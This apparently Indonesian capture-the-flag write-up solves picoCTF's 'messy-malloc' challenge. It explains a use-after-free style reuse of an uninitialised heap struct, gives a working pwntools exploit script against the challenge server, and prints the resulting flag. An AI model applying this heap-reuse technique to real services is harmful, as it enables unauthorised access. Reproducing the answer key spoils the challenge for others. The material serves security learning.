# messy-malloc (300 Points)
Can you take advantage of misused malloc calls to leak the secret through this service and get the flag? Connect with nc 2019shell1.picoctf.com 37915. Source.
# Solved
Disini kita diberikan sebuah file binary
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define LINE_MAX 256
#define ACCESS_CODE_LEN 16
#define FLAG_SIZE 64

struct user {
  char *username;
  char access_code[ACCESS_CODE_LEN];
  char *files;
};

struct user anon_user;
struct user *u;

void print_flag() {
  char flag[FLAG_SIZE];
  FILE *f = fopen("flag.txt", "r");
  if (f == NULL) {
    printf("Please make sure flag.txt exists\n");
    exit(0);
  }

  if ((fgets(flag, FLAG_SIZE, f)) == NULL){
    puts("Couldn't read flag file.");
    exit(1);
  };

  unsigned long ac1 = ((unsigned long *)u->access_code)[0];
  unsigned long ac2 = ((unsigned long *)u->access_code)[1];
  if (ac1 != 0x4343415f544f4f52 || ac2 != 0x45444f435f535345) {
    fprintf(stdout, "Incorrect Access Code: \"");
    for (int i = 0; i < ACCESS_CODE_LEN; i++) {
      putchar(u->access_code[i]);
    }
    fprintf(stdout, "\"\n");
    return;
  }
  
  puts(flag);
  fclose(f);
}

void menu() {
  puts("Commands:");
  puts("\tlogin - login as a user");
  puts("\tprint-flag - print the flag");
  puts("\tlogout - log out");
  puts("\tquit - exit the program");
}
 
const char *get_username(struct user *u) {
  if (u->username == NULL) {
    return "anon";
  }
  else {
    return u->username;
  }
}

int login() {
  u = malloc(sizeof(struct user));

  int username_len;
  puts("Please enter the length of your username");
  scanf("%d", &username_len);
  getc(stdin);

  char *username = malloc(username_len+1);
  u->username = username;

  puts("Please enter your username");
  if (fgets(username, username_len, stdin) == NULL) {
    puts("fgets failed");
    exit(-1);
  }

  char *end;
  if ((end=strchr(username, '\n')) != NULL) {
    end[0] = '\0';
  }
  
  return 0;
  
}

int logout() {
  char *user = u->username;
  if (u == &anon_user) {
    return -1;
  }
  else {
    free(u);
    free(user);
    u = &anon_user;
  }
  return 0;
}

int main(int argc, char **argv) {

  setbuf(stdout, NULL);

  char buf[LINE_MAX];

  memset(anon_user.access_code, 0, ACCESS_CODE_LEN);
  anon_user.username = NULL;

  u = &anon_user;
  
  menu();

  while(1) {
    puts("\nEnter your command:");
    fprintf(stdout, "[%s]> ", get_username(u));

    if(fgets(buf, LINE_MAX, stdin) == NULL)
      break;

    if (!strncmp(buf, "login", 5)){
      login();
    }
    else if(!strncmp(buf, "print-flag", 10)){
      print_flag();
    }
    else if(!strncmp(buf, "logout", 6)){
      logout();
    }
    else if(!strncmp(buf, "quit", 4)){
      return 0;
    }
    else{
      puts("Invalid option");
      menu();
    }
  }
}
```
Pada kasus ini, tidak memiliki unsur <b>Bufferoverflow</b> akan tetapi <b>Heap</b> pada <b>malloc</b>, pada kode
```cpp
int login() {
  u = malloc(sizeof(struct user));

  int username_len;
  puts("Please enter the length of your username");
  scanf("%d", &username_len);
  getc(stdin);

  char *username = malloc(username_len+1);
  u->username = username;

  puts("Please enter your username");
  if (fgets(username, username_len, stdin) == NULL) {
    puts("fgets failed");
    exit(-1);
  }

  char *end;
  if ((end=strchr(username, '\n')) != NULL) {
    end[0] = '\0';
  }
  return 0;
}
```
```cpp
u = malloc(sizeof(struct user));

int username_len;
puts("Please enter the length of your username");
scanf("%d", &username_len);
getc(stdin);

char *username = malloc(username_len+1); // Celahnya disini
u->username = username;
```
Disini kita bisa melebihi size dari struct user tersebut, diketahui bahwa besar dari <b>char pointer</b> adalah <b>8 byte</b>
```cpp
struct user {
  char *username; // 8 Byte
  char access_code[ACCESS_CODE_LEN]; // 16 Byte (ROOT_ACCESS_CODE)
  char *files; // 8 Byte
};
```
Sebelum mendapatkan flag kita harus melewati instruksi ini
```cpp
(ac1 != 0x4343415f544f4f52 || ac2 != 0x45444f435f535345)
```
Jika hex tersebut di ubah menjadi string maka hasilnya <b>ROOT_ACCESS_CODE</b>, disini sudah kita dapati logika pada struktur tersebut. Bahwasannya kita harus mencoba meng-overwrite address pada struct <b>access_code</b>, inilah code yang saya gunakan
```python
from pwn import *

p = remote("2019shell1.picoctf.com", 37915)

ROOT = "ROOT_ACCESS_CODE"
PAYLOAD = "A" * 8 + ROOT + "A" * 8

# Login
p.sendlineafter("command:", "login")
p.sendlineafter("length", str(len(PAYLOAD)))
p.sendlineafter("enter", PAYLOAD)

# Logout
p.sendlineafter("command:", "logout")
p.sendlineafter("command:", "login")
p.sendlineafter("length", str(3))
p.sendlineafter("enter", "ANY")

p.sendlineafter("command:", "print-flag")

p.recv()

p.interactive()
```
```console
$ python solve.py
[+] Opening connection to 2019shell1.picoctf.com on port 37915: Done
[*] Switching to interactive mode
picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_4ac50b08}
```
Flag : <b>picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_4ac50b08}</b>